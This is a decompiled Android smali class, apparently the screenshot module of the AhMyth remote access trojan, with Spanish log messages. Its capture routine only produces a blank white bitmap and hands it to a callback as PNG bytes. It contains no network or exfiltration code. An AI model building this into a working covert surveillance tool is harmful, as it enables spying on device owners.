.class public Lahmyth/mine/king/ahmyth/ScreenshotManager;
.super Ljava/lang/Object;
.source "ScreenshotManager.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lahmyth/mine/king/ahmyth/ScreenshotManager$ScreenshotCallback;
    }
.end annotation


# static fields
.field private static final TAG:Ljava/lang/String; = "ScreenshotManager"


# instance fields
.field private context:Landroid/content/Context;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 0

    .line 19
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 20
    iput-object p1, p0, Lahmyth/mine/king/ahmyth/ScreenshotManager;->context:Landroid/content/Context;

    return-void
.end method

.method private bitmapToByteArray(Landroid/graphics/Bitmap;)[B
    .locals 3

    .line 96
    :try_start_0
    new-instance v0, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v0}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 97
    sget-object v1, Landroid/graphics/Bitmap$CompressFormat;->PNG:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v2, 0x64

    invoke-virtual {p1, v1, v2, v0}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    .line 98
    invoke-virtual {v0}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object p1

    .line 99
    invoke-virtual {v0}, Ljava/io/ByteArrayOutputStream;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object p1

    :catch_0
    move-exception p1

    .line 102
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "Error convirtiendo: "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string v0, "ScreenshotManager"

    invoke-static {v0, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    const/4 p1, 0x0

    return-object p1
.end method

.method private captureScreen()Landroid/graphics/Bitmap;
    .locals 7

    const-string v0, "x"

    const-string v1, "ScreenshotManager"

    const/4 v2, 0x0

    .line 64
    :try_start_0
    iget-object v3, p0, Lahmyth/mine/king/ahmyth/ScreenshotManager;->context:Landroid/content/Context;

    const-string v4, "window"

    invoke-virtual {v3, v4}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/view/WindowManager;

    if-nez v3, :cond_0

    const-string v0, "WindowManager es null"

    .line 66
    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    return-object v2

    .line 70
    :cond_0
    new-instance v4, Landroid/util/DisplayMetrics;

    invoke-direct {v4}, Landroid/util/DisplayMetrics;-><init>()V

    .line 71
    invoke-interface {v3}, Landroid/view/WindowManager;->getDefaultDisplay()Landroid/view/Display;

    move-result-object v3

    invoke-virtual {v3, v4}, Landroid/view/Display;->getRealMetrics(Landroid/util/DisplayMetrics;)V

    .line 73
    iget v3, v4, Landroid/util/DisplayMetrics;->widthPixels:I

    .line 74
    iget v4, v4, Landroid/util/DisplayMetrics;->heightPixels:I

    .line 76
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "Screen: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v1, v5}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 79
    sget-object v5, Landroid/graphics/Bitmap$Config;->ARGB_8888:Landroid/graphics/Bitmap$Config;

    invoke-static {v3, v4, v5}, Landroid/graphics/Bitmap;->createBitmap(IILandroid/graphics/Bitmap$Config;)Landroid/graphics/Bitmap;

    move-result-object v3

    .line 80
    new-instance v4, Landroid/graphics/Canvas;

    invoke-direct {v4, v3}, Landroid/graphics/Canvas;-><init>(Landroid/graphics/Bitmap;)V

    const/4 v5, -0x1

    .line 81
    invoke-virtual {v4, v5}, Landroid/graphics/Canvas;->drawColor(I)V

    .line 83
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "Bitmap creado: "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Landroid/graphics/Bitmap;->getWidth()I

    move-result v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Landroid/graphics/Bitmap;->getHeight()I

    move-result v0

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object v3

    :catch_0
    move-exception v0

    .line 88
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Error capturando: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    return-object v2
.end method

.method static synthetic lambda$null$0(Lahmyth/mine/king/ahmyth/ScreenshotManager$ScreenshotCallback;[B)V
    .locals 1

    const/4 v0, 0x0

    .line 41
    invoke-interface {p0, p1, v0}, Lahmyth/mine/king/ahmyth/ScreenshotManager$ScreenshotCallback;->onScreenshotTaken([BLjava/lang/String;)V

    return-void
.end method

.method static synthetic lambda$null$1(Lahmyth/mine/king/ahmyth/ScreenshotManager$ScreenshotCallback;)V
    .locals 2

    const/4 v0, 0x0

    const-string v1, "Could not capture bitmap"

    .line 48
    invoke-interface {p0, v0, v1}, Lahmyth/mine/king/ahmyth/ScreenshotManager$ScreenshotCallback;->onScreenshotTaken([BLjava/lang/String;)V

    return-void
.end method

.method static synthetic lambda$null$2(Lahmyth/mine/king/ahmyth/ScreenshotManager$ScreenshotCallback;Ljava/lang/Exception;)V
    .locals 1

    .line 55
    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    const/4 v0, 0x0

    invoke-interface {p0, v0, p1}, Lahmyth/mine/king/ahmyth/ScreenshotManager$ScreenshotCallback;->onScreenshotTaken([BLjava/lang/String;)V

    return-void
.end method


# virtual methods
.method public synthetic lambda$takeScreenshot$3$ScreenshotManager(Lahmyth/mine/king/ahmyth/ScreenshotManager$ScreenshotCallback;)V
    .locals 5

    const-string v0, "ScreenshotManager"

    .line 33
    :try_start_0
    invoke-direct {p0}, Lahmyth/mine/king/ahmyth/ScreenshotManager;->captureScreen()Landroid/graphics/Bitmap;

    move-result-object v1

    if-eqz v1, :cond_0

    .line 36
    invoke-direct {p0, v1}, Lahmyth/mine/king/ahmyth/ScreenshotManager;->bitmapToByteArray(Landroid/graphics/Bitmap;)[B

    move-result-object v2

    .line 37
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "\u2705 Screenshot exitoso: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    array-length v4, v2

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v4, " bytes"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v0, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 40
    new-instance v3, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v4

    invoke-direct {v3, v4}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v4, Lahmyth/mine/king/ahmyth/-$$Lambda$ScreenshotManager$xa_5DcAGhQucpnVbO-J7ckzUl_U;

    invoke-direct {v4, p1, v2}, Lahmyth/mine/king/ahmyth/-$$Lambda$ScreenshotManager$xa_5DcAGhQucpnVbO-J7ckzUl_U;-><init>(Lahmyth/mine/king/ahmyth/ScreenshotManager$ScreenshotCallback;[B)V

    invoke-virtual {v3, v4}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    .line 44
    invoke-virtual {v1}, Landroid/graphics/Bitmap;->recycle()V

    goto :goto_0

    :cond_0
    const-string v1, "\u274c Bitmap es null"

    .line 46
    invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 47
    new-instance v1, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v2

    invoke-direct {v1, v2}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v2, Lahmyth/mine/king/ahmyth/-$$Lambda$ScreenshotManager$X1UOasLWaMEpIWZHnnJEpuZZ3iU;

    invoke-direct {v2, p1}, Lahmyth/mine/king/ahmyth/-$$Lambda$ScreenshotManager$X1UOasLWaMEpIWZHnnJEpuZZ3iU;-><init>(Lahmyth/mine/king/ahmyth/ScreenshotManager$ScreenshotCallback;)V

    invoke-virtual {v1, v2}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    .line 52
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "\u274c Error: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 53
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    .line 54
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v2

    invoke-direct {v0, v2}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v2, Lahmyth/mine/king/ahmyth/-$$Lambda$ScreenshotManager$sBQENDu7elzqTXcyQdJXYhKNc-U;

    invoke-direct {v2, p1, v1}, Lahmyth/mine/king/ahmyth/-$$Lambda$ScreenshotManager$sBQENDu7elzqTXcyQdJXYhKNc-U;-><init>(Lahmyth/mine/king/ahmyth/ScreenshotManager$ScreenshotCallback;Ljava/lang/Exception;)V

    invoke-virtual {v0, v2}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    :goto_0
    return-void
.end method

.method public takeScreenshot(Lahmyth/mine/king/ahmyth/ScreenshotManager$ScreenshotCallback;)V
    .locals 2

    const-string v0, "ScreenshotManager"

    const-string v1, "Tomando screenshot..."

    .line 28
    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 31
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lahmyth/mine/king/ahmyth/-$$Lambda$ScreenshotManager$uRfAKktB2QOU2NG05MwZT1Nu3iA;

    invoke-direct {v1, p0, p1}, Lahmyth/mine/king/ahmyth/-$$Lambda$ScreenshotManager$uRfAKktB2QOU2NG05MwZT1Nu3iA;-><init>(Lahmyth/mine/king/ahmyth/ScreenshotManager;Lahmyth/mine/king/ahmyth/ScreenshotManager$ScreenshotCallback;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 58
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method
